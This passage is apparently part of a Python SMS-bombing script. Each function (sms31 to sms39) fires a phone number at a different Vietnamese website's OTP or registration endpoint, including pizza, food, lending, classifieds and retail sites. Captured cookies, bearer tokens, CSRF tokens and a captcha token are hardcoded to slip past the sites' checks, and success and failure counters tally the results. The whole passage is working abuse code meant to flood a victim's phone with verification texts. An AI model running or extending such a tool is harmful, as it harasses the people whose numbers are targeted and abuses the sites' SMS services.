        '_ttp': '8QojcD2E-4ZWQyk38eZM5QTGEw2',
        '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus',
        '.Nop.Customer': 'ba54ce0a-13e1-453c-8363-88bf017b8dcf',
        '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
    }

    headers = {
        'authority': 'thepizzacompany.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.612062991.1693832247; _ga=GA1.2.2100968570.1693832247; _gid=GA1.2.823438155.1693832247; _tt_enable_cookie=1; _ttp=8QojcD2E-4ZWQyk38eZM5QTGEw2; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus; .Nop.Customer=ba54ce0a-13e1-453c-8363-88bf017b8dcf; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
        'dnt': '1',
        'origin': 'https://thepizzacompany.vn',
        'referer': 'https://thepizzacompany.vn/Otp',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdA6eKbtod3RRZhW0oMAbjY51WN7NObT74BSrixWfCNutY-oIWf45xqyHeDAqa6uoqs1jgc1YTZb9K75G_VbjoHC5Tpa6zerOu5KrKhCjOuHPKVnuUfgka_VUVi1RwMXbg',
    }

    response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms31(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gcl_au': '1.1.621175732.1703862038',
        '_ga': 'GA1.1.1365287929.1703862041',
        '_tt_enable_cookie': '1',
        '_ttp': 'ND5eC2lhZd7Sracvqbh-Nlb6Ioa',
        '_fbp': 'fb.1.1703862042460.762032013',
        'ubo_trade': '%7B%22code%22%3A%22101019000%22%2C%22name%22%3A%22H%C3%A0%20N%E1%BB%99i%22%2C%22email%22%3A%22info%40ubofood.com%22%2C%22phone_number%22%3A%220344350998%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%221%22%2C%22name%22%3A%22Mi%E1%BB%81n%20B%E1%BA%AFc%22%7D%2C%22city%22%3A%7B%22code%22%3A%2201%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%C3%A0%20N%E1%BB%99i%22%7D%2C%22district%22%3A%7B%22code%22%3A%22019%22%2C%22name%22%3A%22Qu%E1%BA%ADn%20Nam%20T%E1%BB%AB%20Li%C3%AAm%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2200637%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20Trung%20V%C4%83n%22%7D%2C%22text%22%3A%22CT1A%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A20.995577269420178%2C%22lng%22%3A105.77924502563441%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-07-05T15%3A16%3A56.5Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A36.733Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%2200616002%22%7D',
        'ubo_token': 'Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ',
        '_ga_KCGG79N4SY': 'GS1.1.1703862040.1.1.1703862075.0.0.0',
        '_ga_3PKTQRQF3P': 'GS1.1.1703862040.1.1.1703862078.22.0.0',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        # 'Cookie': '_gcl_au=1.1.621175732.1703862038; _ga=GA1.1.1365287929.1703862041; _tt_enable_cookie=1; _ttp=ND5eC2lhZd7Sracvqbh-Nlb6Ioa; _fbp=fb.1.1703862042460.762032013; ubo_trade=%7B%22code%22%3A%22101019000%22%2C%22name%22%3A%22H%C3%A0%20N%E1%BB%99i%22%2C%22email%22%3A%22info%40ubofood.com%22%2C%22phone_number%22%3A%220344350998%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%221%22%2C%22name%22%3A%22Mi%E1%BB%81n%20B%E1%BA%AFc%22%7D%2C%22city%22%3A%7B%22code%22%3A%2201%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%C3%A0%20N%E1%BB%99i%22%7D%2C%22district%22%3A%7B%22code%22%3A%22019%22%2C%22name%22%3A%22Qu%E1%BA%ADn%20Nam%20T%E1%BB%AB%20Li%C3%AAm%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2200637%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20Trung%20V%C4%83n%22%7D%2C%22text%22%3A%22CT1A%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A20.995577269420178%2C%22lng%22%3A105.77924502563441%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-07-05T15%3A16%3A56.5Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A36.733Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%2200616002%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ; _ga_KCGG79N4SY=GS1.1.1703862040.1.1.1703862075.0.0.0; _ga_3PKTQRQF3P=GS1.1.1703862040.1.1.1703862078.22.0.0',
        'DNT': '1',
        'Origin': 'https://ubofood.com',
        'Referer': 'https://ubofood.com/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone_number': phone,
        'trade_code': '101019000',
        'captcha': '03AFcWeA57DLZ2vpQbBNFdhiRbVl9Tl7LLgZNidOGidwem9Qe35fs7vriYjyeNbAHMucJqqubWkbk3utAUXx4-qrLh-ua7cURkFSvCbwjHP-5c8JzP8X8SYo9pTUGqpvBzMhidETa3Z8VDrHiiIfqmsYmEDqxnboFGMQx5CB44u8UxKmqg2egTmd2FGbYheVmTEPUUMZhP84u8T0N_R8_ybq2_2KhyvBETIX2iZni8vRSjl0osIeZ3GAqrq9goXdsml2AEi5s9HfHvktW00l5xvaNvt4FT-AHcqML0jvq-y95-J7sPzjjZRHpKD1q0Mw9NvGR_iFe6DkKpuuM83OjgWVRW2JxCRDE2FKZQ3p7Z0qIV4NqaxlJdTl6lE0RRqXnUAZiEkN0Rm4sSPhD4JkUYJPkAbDMp9FcVb_23bMBDkFtw7jmVaD6FxLFMC99Yl6xR6AUMp3ECYVHeuGV6zchUydZp3aTQAYgIFAipAUGym3eIRuaeq0TfxIzcRNMAtgkYMrwyVFrT46aMYDhQqScFUQvTRve0tpBcmgIwjyb9893ThF54reVSqAHyYoAHPcEUnXJqxvl3onmNehC_qzdNCN6jX9IKKDsvZA',
    }

    response = requests.post('https://ubofood.com/auth/register', cookies=cookies, headers=headers, json=json_data)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms32(phone):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://www.tiencash.com',
        'Referer': 'https://www.tiencash.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'deviceInfo': '{"operationSys":"","channel":null,"isMobile":"0","navigatorInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","screenHeight":768,"screenWidth":1366}',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'token': 'null',
    }

    data = {
        'phone': phone,
        'sign': '67d44dda-b29f-48a4-9830-67121bc618f8',
    }

    response = requests.post('https://api.tiencash.com/v1/verify/sms/send', headers=headers, data=data)
def sms33(phone):
    global thanhcong
    cookies = {
        '_cfuvid': '_0Whbo9vhBgRfrX3KU.0_Em.3JNUy5p8NFpTsv0g07g-1703862344968-0-604800000',
        '_gcl_au': '1.1.1302306825.1703862353',
        'ctfp': 'af0b5e10-f911-435d-8219-ea319f569cad',
        'showInsertAdOnboarding': 'true',
        'cf_clearance': '7PVCE6rX6Mz9UV9bIHmL7EeNGtGWPPwv2rzp1SjXN6A-1703862357-0-2-9d5da78d.b957bcb1.ca5cf86d-0.2.1703862357',
        '_gid': 'GA1.2.754189873.1703862358',
        '_gat_UA-54934741-3': '1',
        '_fbp': 'fb.1.1703862360800.11155083',
        '_ga': 'GA1.2.1777081749.1703862358',
        'FCNEC': '%5B%5B%22AKsRol_ciqRB1xZluibXdogEf1wY5NcwxTUVCV7gL3lzzI9H-0Rhja7YDAYJfKgXp5X4qNLUwb8vJPDpeF2wEuL1JCy-m60XTJVGptiz0SrQcoDCG_l_tX-ybKmaGLZZI1WzHQMUGlCS6wErdDh02FYLFpvBJjSKQg%3D%3D%22%5D%5D',
        '_ga_XQVN5K27XX': 'GS1.1.1703862358.1.1.1703862387.31.0.0',
    }

    headers = {
        'authority': 'id.chotot.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'baggage': 'sentry-environment=prod,sentry-release=ct-web-chotot-id%402.0.0,sentry-transaction=%2Fregister%2Fotp,sentry-public_key=a0cf9ad72b214ec5a3264cec648ff179,sentry-trace_id=3bb6c23624f34a47bb017aa52ab0241a,sentry-sample_rate=0.1',
        # 'cookie': '_cfuvid=_0Whbo9vhBgRfrX3KU.0_Em.3JNUy5p8NFpTsv0g07g-1703862344968-0-604800000; _gcl_au=1.1.1302306825.1703862353; ctfp=af0b5e10-f911-435d-8219-ea319f569cad; showInsertAdOnboarding=true; cf_clearance=7PVCE6rX6Mz9UV9bIHmL7EeNGtGWPPwv2rzp1SjXN6A-1703862357-0-2-9d5da78d.b957bcb1.ca5cf86d-0.2.1703862357; _gid=GA1.2.754189873.1703862358; _gat_UA-54934741-3=1; _fbp=fb.1.1703862360800.11155083; _ga=GA1.2.1777081749.1703862358; FCNEC=%5B%5B%22AKsRol_ciqRB1xZluibXdogEf1wY5NcwxTUVCV7gL3lzzI9H-0Rhja7YDAYJfKgXp5X4qNLUwb8vJPDpeF2wEuL1JCy-m60XTJVGptiz0SrQcoDCG_l_tX-ybKmaGLZZI1WzHQMUGlCS6wErdDh02FYLFpvBJjSKQg%3D%3D%22%5D%5D; _ga_XQVN5K27XX=GS1.1.1703862358.1.1.1703862387.31.0.0',
        'dnt': '1',
        'referer': 'https://id.chotot.com/register',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sentry-trace': '3bb6c23624f34a47bb017aa52ab0241a-83bbc78ff51d14b7-0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-nextjs-data': '1',
    }

    params = {
        'phone': phone,
    }

    response = requests.get(
        'https://id.chotot.com/_next/data/FbXG9nuM-6zJwYIP9V0dP/register/otp.json',
        params=params,
        cookies=cookies,
        headers=headers,
    )
    thanhcong+=1
def sms34(phone):
    global thanhcong
    headers = {
        'Host': 'api.cashbar.tech',
        # 'content-length': '40',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://h5.cashbar.tech',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://h5.cashbar.tech/',
        # 'accept-encoding': 'gzip, deflate',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
        'phone': phone,
        'type': '2',
        'ctype': '1',
        'chntoken': '',
    }

    response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data)
    thanhcong +=1
def sms35(phone):
    global thanhcong
    global thatbai
    link = 'https://www.sapo.vn/fnb/checkphonenumber?phonenumber='+phone
    response = requests.post(link)
    thanhcong+=1
def sms36(phone):
    global thanhcong
    global thatbai
    link=  'https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json?phoneNumber='+phone
    requests.post(link)
    thanhcong+=1
def sms37(phone):
    Headers = {"Host": "nhadat.cafeland.vn","content-length": "65","accept": "application/json, text/javascript, */*; q\u003d0.01","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://nhadat.cafeland.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://nhadat.cafeland.vn/dang-ky.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "laravel_session\u003deyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"}
    Payload = {"mobile": phone,"_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w",}
    response = requests.post("https://nhadat.cafeland.vn/member-send-otp/", data=Payload, headers=Headers)
def sms38(phone):
  global thanhcong
  global thatbai
  def random_string(length):
      import random
      characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
      result = ""
      for _ in range(length):
          result += random.choice(characters)
      return result
  alo=random_string(8)
  ten=random_string(4)
  phone = '0' + phone
  phone = phone.replace('00','')
  phone12 = '+84' + phone
  cookies = {'ads': 'www.google.com','refcode': '746','time_referer': '1689061704','kvas-uuid': '3a85af4a-1908-48f2-980d-d15395992de5','kvas-uuid-d': '1686469706132','gkvas-uuid': 'fc23dc65-4af3-4711-8198-90a46e6b0ca1','gkvas-uuid-d': '1686469706134','kv-session': '94e736d4-493e-4656-9a6a-266817374182','_hjFirstSeen': '1','_hjIncludedInSessionSample_563959': '1','_hjSession_563959': 'eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==','_gid': 'GA1.2.1638977009.1686469708','_tt_enable_cookie': '1','_ttp': 'KrXyjN8UQfZPEg6udl4pOmk7Tnd','_gac_UA-158809353-1': '1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','_gac_UA-64814867-1': '1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','source_referer': '%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D','kv-session-d': '1686469712238','_hjSessionUser_563959': 'eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==','parent': '77','_ga': 'GA1.2.1398574114.1686469708','_ga_6HE3N545ZW': 'GS1.1.1686469708.1.1.1686469715.53.0.0','_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',}
  headers = {'authority': 'www.kiotviet.vn','accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','dnt': '1','origin': 'https://www.kiotviet.vn','referer': 'https://www.kiotviet.vn/dang-ky/?refcode=746','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
  data = {'phone': phone12,'code': alo,'name': 'lê van sang','email': '','zone': 'An Giang - Huyện Châu Phú','merchant': 'muabansi','username': phone,'industry': 'Thời trang','ref_code': '746','industry_id': '77','phone_input': phone,}
  response = requests.post('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',cookies=cookies,headers=headers,data=data,)
  if 'success' in response.text:
    thanhcong+=1
  else:
    thatbai+=1
def sms39(phone):
    global thanhcong
    cookies = {
        '_csrf': '973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D',
        '_gcl_au': '1.1.1635282769.1685511240',
        '_gid': 'GA1.2.147827434.1685511243',
        '_gac_UA-53976512-2': '1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        '_gat_gtag_UA_53976512_2': '1',
        '_dc_gtm_UA-53976512-2': '1',
        'vid': '1468653',
        '_gcl_aw': 'GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        '_ga': 'GA1.1.1662212097.1685511243',
        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2',
        '_ga_D022K7SJPP': 'GS1.1.1685511244.1.1.1685511263.41.0.0',
    }

    headers = {
        'authority': 'www.nhaphang247.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'cookie': '_csrf=973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D; _gcl_au=1.1.1635282769.1685511240; _gid=GA1.2.147827434.1685511243; _gac_UA-53976512-2=1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _gat_gtag_UA_53976512_2=1; _dc_gtm_UA-53976512-2=1; vid=1468653; _gcl_aw=GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE; _ga=GA1.1.1662212097.1685511243; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2; _ga_D022K7SJPP=GS1.1.1685511244.1.1.1685511263.41.0.0',
        'dnt': '1',
        'origin': 'https://www.nhaphang247.com',
        'referer': 'https://www.nhaphang247.com/huong-dan-dat-hang?utm_source=google&utm_medium=keywords&utm_campaign=adwords&gclid=CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-csrf-token': 'ZDR1dGxJa2stfwEVBg8zCTZ3FxYkDA8DO0A5Fj19DFoIWRwkXH4iOA==',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
